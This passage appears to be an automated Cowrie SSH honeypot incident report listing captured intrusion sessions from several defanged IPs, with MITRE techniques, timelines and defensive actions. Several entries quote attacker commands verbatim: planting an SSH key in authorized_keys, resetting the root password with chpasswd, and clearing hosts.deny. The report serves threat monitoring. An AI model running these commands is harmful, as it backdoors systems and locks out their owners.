| **Last Seen** | 2026-06-01 10:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:00:40` | `cowrie.session.connect` |
| `2026-06-01 10:00:40` | `cowrie.client.version` |
| `2026-06-01 10:00:40` | `cowrie.client.kex` |
| `2026-06-01 10:00:42` | `cowrie.login.success` |
| `2026-06-01 10:00:42` | `cowrie.session.params` |
| `2026-06-01 10:00:42` | `cowrie.command.input` |
| `2026-06-01 10:00:42` | `cowrie.command.failed` |
| `2026-06-01 10:00:43` | `cowrie.log.closed` |
| `2026-06-01 10:00:43` | `cowrie.session.params` |
| `2026-06-01 10:00:43` | `cowrie.command.input` |
| `2026-06-01 10:00:44` | `cowrie.session.file_download` |
| `2026-06-01 10:00:44` | `cowrie.log.closed` |
| `2026-06-01 10:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69889d4802a6

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 10:00 |
| **Last Seen** | 2026-06-01 10:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:00:47` | `cowrie.session.connect` |
| `2026-06-01 10:00:47` | `cowrie.client.version` |
| `2026-06-01 10:00:47` | `cowrie.client.kex` |
| `2026-06-01 10:00:49` | `cowrie.login.success` |
| `2026-06-01 10:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cc4e57c4f5d

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 10:02 |
| **Last Seen** | 2026-06-01 10:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:02:31` | `cowrie.session.connect` |
| `2026-06-01 10:02:31` | `cowrie.client.version` |
| `2026-06-01 10:02:32` | `cowrie.client.kex` |
| `2026-06-01 10:02:33` | `cowrie.login.success` |
| `2026-06-01 10:02:34` | `cowrie.session.params` |
| `2026-06-01 10:02:34` | `cowrie.command.input` |
| `2026-06-01 10:02:34` | `cowrie.command.failed` |
| `2026-06-01 10:02:34` | `cowrie.log.closed` |
| `2026-06-01 10:02:35` | `cowrie.session.params` |
| `2026-06-01 10:02:35` | `cowrie.command.input` |
| `2026-06-01 10:02:35` | `cowrie.session.file_download` |
| `2026-06-01 10:02:35` | `cowrie.log.closed` |
| `2026-06-01 10:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-690b79317a2a

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 10:02 |
| **Last Seen** | 2026-06-01 10:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:02:40` | `cowrie.session.connect` |
| `2026-06-01 10:02:40` | `cowrie.client.version` |
| `2026-06-01 10:02:40` | `cowrie.client.kex` |
| `2026-06-01 10:02:41` | `cowrie.login.success` |
| `2026-06-01 10:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c1f50e90d4

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 10:02 |
| **Last Seen** | 2026-06-01 10:03 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:02:50` | `cowrie.session.connect` |
| `2026-06-01 10:02:50` | `cowrie.client.version` |
| `2026-06-01 10:02:50` | `cowrie.client.kex` |
| `2026-06-01 10:02:51` | `cowrie.login.success` |
| `2026-06-01 10:02:52` | `cowrie.session.params` |
| `2026-06-01 10:02:52` | `cowrie.command.input` |
| `2026-06-01 10:02:52` | `cowrie.command.failed` |
| `2026-06-01 10:02:52` | `cowrie.log.closed` |
| `2026-06-01 10:02:53` | `cowrie.session.params` |
| `2026-06-01 10:02:53` | `cowrie.command.input` |
| `2026-06-01 10:02:53` | `cowrie.session.file_download` |
| `2026-06-01 10:02:53` | `cowrie.log.closed` |
| `2026-06-01 10:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b33be9b107ee

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 10:02 |
| **Last Seen** | 2026-06-01 10:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:02:59` | `cowrie.session.connect` |
| `2026-06-01 10:02:59` | `cowrie.client.version` |
| `2026-06-01 10:02:59` | `cowrie.client.kex` |
| `2026-06-01 10:03:00` | `cowrie.login.success` |
| `2026-06-01 10:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5afad16d764d

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 10:03 |
| **Last Seen** | 2026-06-01 10:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:03:57` | `cowrie.session.connect` |
| `2026-06-01 10:03:57` | `cowrie.client.version` |
| `2026-06-01 10:03:58` | `cowrie.client.kex` |
| `2026-06-01 10:03:59` | `cowrie.login.success` |
| `2026-06-01 10:04:00` | `cowrie.session.params` |
| `2026-06-01 10:04:00` | `cowrie.command.input` |
| `2026-06-01 10:04:00` | `cowrie.command.failed` |
| `2026-06-01 10:04:00` | `cowrie.log.closed` |
| `2026-06-01 10:04:01` | `cowrie.session.params` |
| `2026-06-01 10:04:01` | `cowrie.command.input` |
| `2026-06-01 10:04:01` | `cowrie.session.file_download` |
| `2026-06-01 10:04:01` | `cowrie.log.closed` |
| `2026-06-01 10:04:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5a8d96165e2

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 10:04 |
| **Last Seen** | 2026-06-01 10:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:04:04` | `cowrie.session.connect` |
| `2026-06-01 10:04:04` | `cowrie.client.version` |
| `2026-06-01 10:04:04` | `cowrie.client.kex` |
| `2026-06-01 10:04:06` | `cowrie.login.success` |
| `2026-06-01 10:04:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.154.207[.]145` to AbuseIPDB if not already reported
- [ ] Block `198.154.207[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fd7ea348974

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 10:06 |
| **Last Seen** | 2026-06-01 10:06 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:06:06` | `cowrie.session.connect` |
| `2026-06-01 10:06:06` | `cowrie.client.version` |
| `2026-06-01 10:06:08` | `cowrie.client.kex` |
| `2026-06-01 10:06:09` | `cowrie.login.success` |
| `2026-06-01 10:06:10` | `cowrie.session.params` |
| `2026-06-01 10:06:10` | `cowrie.command.input` |
| `2026-06-01 10:06:10` | `cowrie.command.failed` |
| `2026-06-01 10:06:10` | `cowrie.log.closed` |
| `2026-06-01 10:06:11` | `cowrie.session.params` |
| `2026-06-01 10:06:11` | `cowrie.command.input` |
| `2026-06-01 10:06:11` | `cowrie.session.file_download` |
| `2026-06-01 10:06:11` | `cowrie.log.closed` |
| `2026-06-01 10:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92edf8b086b5

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 10:06 |
| **Last Seen** | 2026-06-01 10:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:06:15` | `cowrie.session.connect` |
| `2026-06-01 10:06:15` | `cowrie.client.version` |
| `2026-06-01 10:06:16` | `cowrie.client.kex` |
| `2026-06-01 10:06:17` | `cowrie.login.success` |
| `2026-06-01 10:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e25256e2b74

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]49` |
| **First Seen** | 2026-06-01 10:07 |
| **Last Seen** | 2026-06-01 10:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:07:53` | `cowrie.session.connect` |
| `2026-06-01 10:07:53` | `cowrie.client.version` |
| `2026-06-01 10:07:53` | `cowrie.client.kex` |
| `2026-06-01 10:07:54` | `cowrie.login.success` |
| `2026-06-01 10:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-852b2e8283f8

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]49` |
| **First Seen** | 2026-06-01 10:22 |
| **Last Seen** | 2026-06-01 10:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:22:02` | `cowrie.session.connect` |
| `2026-06-01 10:22:02` | `cowrie.client.version` |
| `2026-06-01 10:22:02` | `cowrie.client.kex` |
| `2026-06-01 10:22:03` | `cowrie.login.success` |
| `2026-06-01 10:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a51fae8262a5

| Field | Detail |
|---|---|
| **Source IP** | `114.80.32[.]225` |
| **First Seen** | 2026-06-01 10:22 |
| **Last Seen** | 2026-06-01 10:22 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:bA5N7EPqGCa1"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:22:31` | `cowrie.session.connect` |
| `2026-06-01 10:22:31` | `cowrie.client.version` |
| `2026-06-01 10:22:31` | `cowrie.client.kex` |
| `2026-06-01 10:22:32` | `cowrie.login.success` |
| `2026-06-01 10:22:32` | `cowrie.session.params` |
| `2026-06-01 10:22:32` | `cowrie.command.input` |
| `2026-06-01 10:22:32` | `cowrie.command.failed` |
| `2026-06-01 10:22:32` | `cowrie.log.closed` |
| `2026-06-01 10:22:33` | `cowrie.session.params` |
| `2026-06-01 10:22:33` | `cowrie.command.input` |
| `2026-06-01 10:22:33` | `cowrie.session.file_download` |
| `2026-06-01 10:22:33` | `cowrie.log.closed` |
| `2026-06-01 10:22:49` | `cowrie.session.params` |
| `2026-06-01 10:22:49` | `cowrie.command.input` |
| `2026-06-01 10:22:49` | `cowrie.log.closed` |
| `2026-06-01 10:22:49` | `cowrie.session.params` |
| `2026-06-01 10:22:49` | `cowrie.command.input` |
| `2026-06-01 10:22:50` | `cowrie.log.closed` |
| `2026-06-01 10:22:50` | `cowrie.session.params` |
| `2026-06-01 10:22:50` | `cowrie.command.input` |
| `2026-06-01 10:22:50` | `cowrie.session.file_download` |
| `2026-06-01 10:22:50` | `cowrie.log.closed` |
| `2026-06-01 10:22:50` | `cowrie.session.params` |
| `2026-06-01 10:22:50` | `cowrie.command.input` |
| `2026-06-01 10:22:51` | `cowrie.log.closed` |
| `2026-06-01 10:22:51` | `cowrie.session.params` |
| `2026-06-01 10:22:51` | `cowrie.command.input` |
| `2026-06-01 10:22:51` | `cowrie.log.closed` |
| `2026-06-01 10:22:51` | `cowrie.session.params` |
| `2026-06-01 10:22:51` | `cowrie.command.input` |
| `2026-06-01 10:22:51` | `cowrie.command.input` |
| `2026-06-01 10:22:52` | `cowrie.log.closed` |
| `2026-06-01 10:22:52` | `cowrie.session.params` |
| `2026-06-01 10:22:52` | `cowrie.command.input` |
| `2026-06-01 10:22:52` | `cowrie.log.closed` |
| `2026-06-01 10:22:53` | `cowrie.session.params` |
| `2026-06-01 10:22:53` | `cowrie.command.input` |
| `2026-06-01 10:22:53` | `cowrie.log.closed` |
| `2026-06-01 10:22:53` | `cowrie.session.params` |
| `2026-06-01 10:22:53` | `cowrie.command.input` |
| `2026-06-01 10:22:53` | `cowrie.log.closed` |
| `2026-06-01 10:22:54` | `cowrie.session.params` |
| `2026-06-01 10:22:54` | `cowrie.command.input` |
| `2026-06-01 10:22:54` | `cowrie.log.closed` |
| `2026-06-01 10:22:54` | `cowrie.session.params` |
| `2026-06-01 10:22:54` | `cowrie.command.input` |
| `2026-06-01 10:22:54` | `cowrie.log.closed` |
| `2026-06-01 10:22:54` | `cowrie.session.params` |
| `2026-06-01 10:22:54` | `cowrie.command.input` |
| `2026-06-01 10:22:55` | `cowrie.log.closed` |
| `2026-06-01 10:22:55` | `cowrie.session.params` |
| `2026-06-01 10:22:55` | `cowrie.command.input` |
| `2026-06-01 10:22:55` | `cowrie.log.closed` |
| `2026-06-01 10:22:55` | `cowrie.session.params` |
| `2026-06-01 10:22:55` | `cowrie.command.input` |
| `2026-06-01 10:22:56` | `cowrie.log.closed` |
| `2026-06-01 10:22:56` | `cowrie.session.params` |
| `2026-06-01 10:22:56` | `cowrie.command.input` |
| `2026-06-01 10:22:56` | `cowrie.log.closed` |
| `2026-06-01 10:22:56` | `cowrie.session.params` |
| `2026-06-01 10:22:56` | `cowrie.command.input` |
| `2026-06-01 10:22:56` | `cowrie.log.closed` |
| `2026-06-01 10:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.80.32[.]225` to AbuseIPDB if not already reported
- [ ] Block `114.80.32[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d77c42522ee9

| Field | Detail |
|---|---|
| **Source IP** | `114.80.32[.]225` |
| **First Seen** | 2026-06-01 10:25 |
| **Last Seen** | 2026-06-01 10:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:25:25` | `cowrie.session.connect` |
| `2026-06-01 10:25:25` | `cowrie.client.version` |
| `2026-06-01 10:25:25` | `cowrie.client.kex` |
| `2026-06-01 10:25:25` | `cowrie.login.success` |
| `2026-06-01 10:25:26` | `cowrie.session.params` |
| `2026-06-01 10:25:26` | `cowrie.command.input` |
| `2026-06-01 10:25:26` | `cowrie.command.failed` |
| `2026-06-01 10:25:27` | `cowrie.log.closed` |
| `2026-06-01 10:25:28` | `cowrie.session.params` |
| `2026-06-01 10:25:28` | `cowrie.command.input` |
| `2026-06-01 10:25:29` | `cowrie.session.file_download` |
| `2026-06-01 10:25:29` | `cowrie.log.closed` |
| `2026-06-01 10:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.80.32[.]225` to AbuseIPDB if not already reported
- [ ] Block `114.80.32[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1975c1067631

| Field | Detail |
|---|---|
| **Source IP** | `114.80.32[.]225` |
| **First Seen** | 2026-06-01 10:25 |
| **Last Seen** | 2026-06-01 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:25:36` | `cowrie.session.connect` |
| `2026-06-01 10:25:37` | `cowrie.client.version` |
| `2026-06-01 10:25:37` | `cowrie.client.kex` |
| `2026-06-01 10:25:38` | `cowrie.login.success` |
| `2026-06-01 10:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.80.32[.]225` to AbuseIPDB if not already reported
- [ ] Block `114.80.32[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a29ea39a050f

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]49` |
| **First Seen** | 2026-06-01 10:36 |
| **Last Seen** | 2026-06-01 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 10:36:18` | `cowrie.session.connect` |
| `2026-06-01 10:36:18` | `cowrie.client.version` |
| `2026-06-01 10:36:18` | `cowrie.client.kex` |
| `2026-06-01 10:36:19` | `cowrie.login.success` |
| `2026-06-01 10:36:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5fb2828c49e

| Field | Detail |
|---|---|
| **Source IP** | `101.126.157[.]138` |
| **First Seen** | 2026-06-01 11:00 |
| **Last Seen** | 2026-06-01 11:00 |
